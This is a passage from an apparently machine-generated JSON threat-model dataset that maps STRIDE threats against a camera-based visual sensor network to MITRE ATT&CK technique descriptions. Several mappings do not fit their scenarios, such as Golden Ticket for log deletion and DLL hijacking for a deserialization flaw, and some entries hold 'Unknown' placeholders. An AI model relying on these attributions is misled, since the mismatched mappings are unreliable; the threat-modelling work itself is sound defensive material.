USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting the known vulnerabilities in the node firmware to crash the devices.",
            "Assumptions": [
                {
                    "Assumption": "Nodes run vulnerable firmware versions",
                    "Role": "System",
                    "Condition": "Updating is not enforced or neglected"
                },
                {
                    "Assumption": "Nodes do not have automated update mechanisms",
                    "Role": "System",
                    "Condition": "Manual updates required for firmware"
                },
                {
                    "Assumption": "Attacker has the ability to run exploitation code",
                    "Role": "Attacker",
                    "Condition": "Network access or physical access"
                }
            ],
            "Potential Impact": "Nodes become inoperative, resulting in loss of visual data feeds.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "firmware attack",
                "device crash"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacker manipulates power supply to camera nodes causing them to restart repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to power supply is possible",
                    "Role": "Attacker",
                    "Condition": "Nodes are placed in unsecured areas"
                },
                {
                    "Assumption": "Nodes lack power protection mechanisms",
                    "Role": "System",
                    "Condition": "No safeguards against power tampering"
                },
                {
                    "Assumption": "No redundant power systems in place",
                    "Role": "System",
                    "Condition": "Single power source for nodes"
                }
            ],
            "Potential Impact": "Disruption of service, intermittent data capture interruptions.",
            "MITRE ATT&CK Keywords": [
                "power manipulation",
                "service disruption",
                "physical tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the central server to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable software is used",
                    "Role": "System",
                    "Condition": "Unpatched or outdated software"
                },
                {
                    "Assumption": "Attacker can discover and exploit the vulnerability",
                    "Role": "Attacker",
                    "Condition": "Access to exploit tool or method"
                },
                {
                    "Assumption": "Server does not follow principle of least privilege",
                    "Role": "System",
                    "Condition": "Excessive privileges granted by default"
                }
            ],
            "Potential Impact": "Complete control over the sensor network, potential for widespread data manipulation and disclosure.",
            "MITRE ATT&CK Keywords": [
                "software exploitation",
                "privilege escalation",
                "root access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using default administrative credentials to gain control over the visual sensor nodes.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials are used on devices",
                    "Role": "System",
                    "Condition": "Installation with factory settings"
                },
                {
                    "Assumption": "Devices are internet-facing",
                    "Role": "System",
                    "Condition": "Devices accessible over the internet"
                },
                {
                    "Assumption": "No password change enforcement policy",
                    "Role": "System",
                    "Condition": "Weak or unaltered default passwords"
                }
            ],
            "Potential Impact": "Unauthorized administrative access, full device control.",
            "MITRE ATT&CK Keywords": [
                "default credentials",
                "admin access",
                "device control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges by exploiting a deserialization vulnerability in the server's web application.",
            "Assumptions": [
                {
                    "Assumption": "Server uses vulnerable deserialization libraries",
                    "Role": "System",
                    "Condition": "Unpatched or insecure libraries"
                },
                {
                    "Assumption": "Attacker can input malicious serialized data",
                    "Role": "Attacker",
                    "Condition": "Access to input endpoints"
                },
                {
                    "Assumption": "No input validation on deserialized data",
                    "Role": "System",
                    "Condition": "Application lacks data validation checks"
                }
            ],
            "Potential Impact": "Gaining higher privileges than allowed, executing arbitrary code on the server.",
            "MITRE ATT&CK Keywords": [
                "deserialization attack",
                "code execution",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate camera node to insert malicious visual data into the network.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to network credentials",
                    "Role": "Network Administrator",
                    "Condition": "Weak network security"
                },
                {
                    "Assumption": "Camera nodes do not validate the authenticity of other nodes",
                    "Role": "System Architect",
                    "Condition": "Lack of mutual authentication"
                },
                {
                    "Assumption": "Spoofing detection mechanisms are not implemented",
                    "Role": "System Administrator",
                    "Condition": "Insufficient security monitoring"
                }
            ],
            "Potential Impact": "Unauthorized data insertion leading to false or misleading visual data.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "network",
                "device",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of the VSN server, redirecting visual data streams to a server they control.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Network Administrator",
                    "Condition": "Unprotected network segments"
                },
                {
                    "Assumption": "VSN server does not use secure channels for data transmission",
                    "Role": "System Architect",
                    "Condition": "Unencrypted communication"
                },
                {
                    "Assumption": "Camera nodes do not verify server identities",
                    "Role": "System Developer",
                    "Condition": "Lack of server identity validation"
                }
            ],
            "Potential Impact": "Unauthorized interception and potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised app to pretend to be a legitimate user, accessing sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has knowledge of user credentials",
                    "Role": "User",
                    "Condition": "Credentials theft or phishing"
                },
                {
                    "Assumption": "Authentication protocols are weak",
                    "Role": "System Architect",
                    "Condition": "Lack of multi-factor authentication"
                },
                {
                    "Assumption": "Access control mechanisms are lenient",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access policies"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of camera nodes to alter the captured visual data.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can physically access camera nodes",
                    "Role": "Physical Security",
                    "Condition": "Physical security vulnerabilities"
                },
                {
                    "Assumption": "Firmware updates are not securely verified",
                    "Role": "System Developer",
                    "Condition": "Lack of firmware validation"
                },
                {
                    "Assumption": "Insufficient monitoring of device integrity",
                    "Role": "System Administrator",
                    "Condition": "No integrity checks in place for devices"
                }
            ],
            "Potential Impact": "Altered or corrupted visual data impairing data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "firmware",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious commands into the VSN's communication protocol, manipulating the visual data streams.",
            "Assumptions": [
                {
                    "Assumption": "Attacker knows the communication protocol",
                    "Role": "System Developer",
                    "Condition": "Lack of encryption or secure protocols"
                },
                {
                    "Assumption": "Network traffic is not adequately monitored",
                    "Role": "Network Administrator",
                    "Condition": "Absence of network monitoring tools"
                },
                {
                    "Assumption": "Intrusion detection systems are weak",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient anomaly detection"
                }
            ],
            "Potential Impact": "Integrity of visual data streams compromised by unauthorized commands.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "protocol",
                "network",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a known software vulnerability to gain control over the VSN and alter its configurations.",
            "Assumptions": [
                {
                    "Assumption": "Software vulnerabilities exist",
                    "Role": "Software Developer",
                    "Condition": "Unpatched software"
                },
                {
                    "Assumption": "Attacker can exploit the vulnerability remotely",
                    "Role": "Network Administrator",
                    "Condition": "Network exposure"
                },
                {
                    "Assumption": "System lacks proper update mechanisms",
                    "Role": "System Administrator",
                    "Condition": "No automated update implementation"
                }
            ],
            "Potential Impact": "Compromised system integrity through unauthorized configuration changes.",
            "MITRE ATT&CK Keywords": [
                "exploitation",
                "vulnerability",
                "software",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having accessed or altered specific visual data, leading to disputes in the system logs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of non-repudiation controls",
                    "Role": "System Architect",
                    "Condition": "No digital signatures or logging mechanisms"
                },
                {
                    "Assumption": "System logs are not securely managed",
                    "Role": "System Administrator",
                    "Condition": "Weak log protection measures"
                },
                {
                    "Assumption": "Access controls are weak",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient access logging"
                }
            ],
            "Potential Impact": "Disputes and challenges in tracing user activities, impacting data integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "access control",
                "digital signatures"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters logs to cover their tracks after tampering with visual data.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has privileged access",
                    "Role": "User",
                    "Condition": "Insider threat or credential compromise"
                },
                {
                    "Assumption": "Logging mechanisms are not tamper-proof",
                    "Role": "System Architect",
                    "Condition": "Insecure logging infrastructure"
                },
                {
                    "Assumption": "Insufficient monitoring of log integrity",
                    "Role": "Security Analyst",
                    "Condition": "Lack of automated log analysis"
                }
            ],
            "Potential Impact": "Loss of log integrity and difficulty in forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "privileged access",
                "data tampering",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Golden Ticket",
                "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",
                "id": "attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1",
                "technique_id": "T1558.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes authorization of altering system settings, creating confusion in accountability.",
            "Assumptions": [
                {
                    "Assumption": "System settings lack audit trails",
                    "Role": "System Architect",
                    "Condition": "No audit logs for configuration changes"
                },
                {
                    "Assumption": "Weaknesses in user authentication",
                    "Role": "Security Analyst",
                    "Condition": "Single-factor authentication"
                },
                {
                    "Assumption": "Access control policies are lenient",
                    "Role": "System Administrator",
                    "Condition": "Inadequate privilege management"
                }
            ],
            "Potential Impact": "Challenges in tracing authorization, impacting system accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trails",
                "access control",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized user intercepts unencrypted visual data transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "System Architect",
                    "Condition": "Use of insecure transmission protocols"
                },
                {
                    "Assumption": "Network lacks segmentation",
                    "Role": "Network Administrator",
                    "Condition": "Unprotected network topology"
                },
                {
                    "Assumption": "Weak access control",
                    "Role": "Security Analyst",
                    "Condition": "Poor network authentication mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network",
                "unencrypted data",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data stored on camera nodes is accessed due to inadequate data protection measures.",
            "Assumptions": [
                {
                    "Assumption": "Data is stored without encryption",
                    "Role": "System Developer",
                    "Condition": "Lack of data encryption mechanisms"
                },
                {
                    "Assumption": "Physical security of nodes is weak",
                    "Role": "Physical Security",
                    "Condition": "Access to nodes by unauthorized personnel"
                },
                {
                    "Assumption": "Insufficient access control policies",
                    "Role": "System Administrator",
                    "Condition": "Lack of strict user permissions"
                }
            ],
            "Potential Impact": "Disclosure of sensitive visual data from compromised camera nodes.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "device",
                "unencrypted data",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
